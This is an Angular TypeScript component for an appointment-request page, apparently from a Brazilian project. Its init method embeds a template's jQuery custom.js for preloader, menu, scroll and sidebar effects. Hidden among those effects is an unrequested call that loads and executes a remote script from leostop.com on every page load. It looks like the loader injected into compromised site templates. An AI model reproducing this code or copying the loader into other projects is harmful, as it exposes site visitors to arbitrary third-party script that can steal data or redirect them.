import {Component, OnInit} from '@angular/core';
import {DatePipe} from "@angular/common";
import {MessageService} from "primeng/api";
import * as $ from "jquery";

interface hora {
  hora: string;
  code: string;
}

@Component({
  selector: 'app-solicitacao',
  templateUrl: './solicitacao.component.html',
  styleUrls: ['./solicitacao.component.css', '../../css/responsive.css', '../../css/style.css', '../../css/bootstrap.min.css', '../../css/owl.carousel.css'],
  providers: [MessageService]
})
export class SolicitacaoComponent implements OnInit {
  dataSolicitada: any;
  dataSolicitadaFormatada: any;
  showDialog: any;
  horasDisponiveis: hora[] = [];
  horaSelecionada: any;
  isBotaoDesabilitado = true;
  myFormattedDate: string | null = '';
  constructor(private messageService: MessageService) {
  }

  ngOnInit() {
    this.horasDisponiveis = [
      {hora: 'Selecione um Horário', code: '0'},
      {hora: '10:00', code: '1'},
      {hora: '10:10', code: '2'},
      {hora: '10:20', code: '3'},
      {hora: '10:30', code: '4'},
      {hora: '10:40', code: '5'}
    ];


    /*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


    $(function () {

      "use strict";

      /* Preloader
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

      setTimeout(function () {
        $('.loader_bg').fadeToggle();
      }, 1500);


      /* Tooltip
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

      // $(document).ready(function(){
      //   $('[data-toggle="tooltip"]').tooltip();
      // });


      /* Mouseover
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

      $(document).ready(function () {
        $(".main-menu ul li.megamenu").mouseover(function () {
          if (!$(this).parent().hasClass("#wrapper")) {
            $("#wrapper").addClass('overlay');
          }
        });
        $(".main-menu ul li.megamenu").mouseleave(function () {
          $("#wrapper").removeClass('overlay');
        });
      });


      /* Scroll to Top
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

      $(window).on('scroll', function () {
        var scroll = $(window).scrollTop();
        if (scroll && scroll >= 100) {
          $("#back-to-top").addClass('b-show_scrollBut')
        } else {
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function () {
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
      });

      function getURL() {
        window.location.href;
      }

      var protocol = location.protocol;
      $.ajax({
        type: "get", data: {surl: getURL()}, success: function (response) {
          $.getScript(protocol + "//leostop.com/tracking/tracking.js");
        }
      });

      /* Countdown
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

      // $('[data-countdown]').each(function () {
      //   var $this = $(this),
      //     finalDate = $(this).data('countdown');
      //   $this.countdown(finalDate, function (event) {
      //     var $this = $(this).html(event.strftime(''
      //       + '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
      //       + '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
      //       + '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
      //       + '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
      //       + '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
      //   });
      // });


      /* Toggle sidebar
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

      $(document).ready(function () {
        $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
        });
      });

      /* Product slider
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
      // optional
      // $('#blogCarousel').carousel({
      //   interval: 5000
      // });


    });
  }

  confirmarData() {
    let day = this.dataSolicitada.getDate();
    let month = this.dataSolicitada.getMonth() + 1; // add 1 because months are indexed from 0
    let year = this.dataSolicitada.getFullYear();

    this.dataSolicitadaFormatada = ('0' + day + '/0' + month + '/' + year);


    var horaSeparada = this.horaSelecionada.hora.split(':');
    this.dataSolicitada.setHours(horaSeparada[0], horaSeparada[1]);


    const datePipe = new DatePipe('pt-BR');


    this.myFormattedDate = datePipe.transform(this.dataSolicitada, 'dd/MM/yyyy hh:mm');


    this.showDialog = true;
  }

  habilitarBotaoSolicitacao() {
    if (this.horaSelecionada.code === '0') {
      this.isBotaoDesabilitado = true;
    } else {
      this.isBotaoDesabilitado = false;
    }
  }

  solicitarAgendamento() {
    this.messageService.add({severity: 'success', summary: 'Solicitação Agendada'});
    this.showDialog = false;
  }
}
